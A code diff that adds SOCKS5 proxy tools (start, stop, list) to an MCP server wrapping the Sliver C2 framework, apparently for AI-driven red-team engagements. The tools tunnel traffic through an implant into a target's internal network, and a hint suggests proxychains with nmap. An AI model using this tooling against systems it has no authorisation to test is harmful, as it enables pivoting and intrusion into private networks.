@@ -53,6 +53,7 @@ def create_server() -> FastMCP:
             "Manages Sliver C2 sessions for red-run. Use start_mtls_listener "
             "to create listeners, generate_implant to build payloads, "
             "list_sessions to see active agents, execute to run commands, "
+            "start_socks_proxy to tunnel into internal networks via SOCKS5, "
             "and start_pivot_listener for internal pivoting."
         ),
     )
@@ -501,6 +502,206 @@ def create_server() -> FastMCP:
             })
         except Exception as e:
             return f"ERROR: {e}"
+
+    # ── SOCKS5 proxy management ────────────────────────────────────
+
+    _socks_proxies: dict[str, dict] = {}
+
+    @mcp.tool()
+    async def start_socks_proxy(session_id: str = "") -> str:
+        """Start a SOCKS5 proxy through a Sliver session.
+
+        Creates a local SOCKS5 listener that tunnels traffic through the
+        implant's C2 channel, enabling access to the target's internal
+        network. Use with proxychains to route tools through the tunnel.
+
+        Runs as a persistent sliver console subprocess. Use
+        stop_socks_proxy to shut it down.
+
+        Args:
+            session_id: Session ID from list_sessions. Required.
+        """
+        if not session_id:
+            return "ERROR: session_id is required."
+        if session_id in _socks_proxies:
+            p = _socks_proxies[session_id]
+            # Verify process is still alive
+            if p["proc"].returncode is None:
+                return json.dumps({
+                    "status": "already_running",
+                    "session_id": session_id,
+                    "port": p["port"],
+                    "endpoint": f"socks5://127.0.0.1:{p['port']}",
+                    "proxychains_line": f"socks5 127.0.0.1 {p['port']}",
+                    "hint": "Use stop_socks_proxy first to restart.",
+                })
+            else:
+                # Stale entry — clean up
+                _socks_proxies.pop(session_id, None)
+
+        config_path = _find_config()
+        if config_path is None:
+            return _NOT_CONFIGURED
+
+        import shutil
+        import subprocess
+
+        sliver_bin = shutil.which("sliver")
+        if not sliver_bin:
+            return "ERROR: sliver client binary not found in PATH."
+
+        # Snapshot listening ports before starting
+        before_ports: set[int] = set()
+        try:
+            ss_out = subprocess.run(
+                ["ss", "-tln"], capture_output=True, text=True, timeout=5
+            )
+            for line in ss_out.stdout.splitlines():
+                for field in line.split():
+                    if field.startswith("127.0.0.1:"):
+                        try:
+                            before_ports.add(int(field.split(":")[1]))
+                        except ValueError:
+                            pass
+        except Exception:
+            pass
+
+        # RC script: connect, use session, start socks5 proxy
+        rc_file = (
+            _PROJECT_ROOT / "engagement" / f".sliver-socks5-{session_id[:8]}.rc"
+        )
+        rc_file.write_text(f"use {session_id}\nsocks5\n")
+
+        try:
+            proc = await asyncio.create_subprocess_exec(
+                sliver_bin, "console", "--rc", str(rc_file),
+                stdout=asyncio.subprocess.DEVNULL,
+                stderr=asyncio.subprocess.DEVNULL,
+                env={**os.environ, "SLIVER_CONFIG": str(config_path)},
+            )
+
+            # Poll for new listening port (SOCKS5 default range 1080-1099)
+            port = None
+            for _ in range(15):
+                await asyncio.sleep(1)
+                if proc.returncode is not None:
+                    rc_file.unlink(missing_ok=True)
+                    return (
+                        "ERROR: Sliver console exited before SOCKS5 "
+                        "proxy started. Is the session alive?"
+                    )
+                try:
+                    ss_proc = await asyncio.create_subprocess_exec(
+                        "ss", "-tln",
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.DEVNULL,
+                    )
+                    stdout, _ = await ss_proc.communicate()
+                    for line in stdout.decode().splitlines():
+                        for field in line.split():
+                            if field.startswith("127.0.0.1:"):
+                                try:
+                                    candidate = int(field.split(":")[1])
+                                except ValueError:
+                                    continue
+                                if (
+                                    candidate not in before_ports
+                                    and 1080 <= candidate <= 1099
+                                ):
+                                    port = candidate
+                                    break
+                        if port:
+                            break
+                except Exception:
+                    pass
+                if port:
+                    break
+
+            if port is None:
+                port = 1081  # assume default if detection failed
+
+            _socks_proxies[session_id] = {
+                "proc": proc,
+                "port": port,
+                "rc": str(rc_file),
+                "pid": proc.pid,
+            }
+
+            return json.dumps({
+                "status": "started",
+                "session_id": session_id,
+                "port": port,
+                "endpoint": f"socks5://127.0.0.1:{port}",
+                "pid": proc.pid,
+                "proxychains_line": f"socks5 127.0.0.1 {port}",
+                "hint": (
+                    "Add to /etc/proxychains4.conf or use: "
+                    "proxychains4 nmap -sT ..."
+                ),
+            })
+        except Exception as e:
+            rc_file.unlink(missing_ok=True)
+            return f"ERROR: Failed to start SOCKS5 proxy: {e}"
+
+    @mcp.tool()
+    async def stop_socks_proxy(session_id: str = "") -> str:
+        """Stop a SOCKS5 proxy for a Sliver session.
+
+        Terminates the sliver console subprocess hosting the proxy.
+
+        Args:
+            session_id: Session ID. Required.
+        """
+        if not session_id:
+            return "ERROR: session_id is required."
+        if session_id not in _socks_proxies:
+            return json.dumps({
+                "status": "not_running",
+                "session_id": session_id,
+            })
+
+        proxy = _socks_proxies.pop(session_id)
+        port = proxy["port"]
+        try:
+            proxy["proc"].terminate()
+            try:
+                await asyncio.wait_for(proxy["proc"].wait(), timeout=5)
+            except asyncio.TimeoutError:
+                proxy["proc"].kill()
+        except ProcessLookupError:
+            pass
+
+        Path(proxy["rc"]).unlink(missing_ok=True)
+
+        return json.dumps({
+            "status": "stopped",
+            "session_id": session_id,
+            "port": port,
+        })
+
+    @mcp.tool()
+    async def list_socks_proxies() -> str:
+        """List active SOCKS5 proxies.
+
+        Returns all running SOCKS5 proxy sessions with their endpoints.
+        """
+        result = []
+        stale = []
+        for sid, proxy in _socks_proxies.items():
+            if proxy["proc"].returncode is not None:
+                stale.append(sid)
+                continue
+            result.append({
+                "session_id": sid,
+                "port": proxy["port"],
+                "endpoint": f"socks5://127.0.0.1:{proxy['port']}",
+                "pid": proxy["pid"],
+            })
+        # Clean stale entries
+        for sid in stale:
+            p = _socks_proxies.pop(sid)
+            Path(p["rc"]).unlink(missing_ok=True)
+        return json.dumps({"proxies": result, "count": len(result)})
 
     # ── Pivot management ────────────────────────────────────────────
 
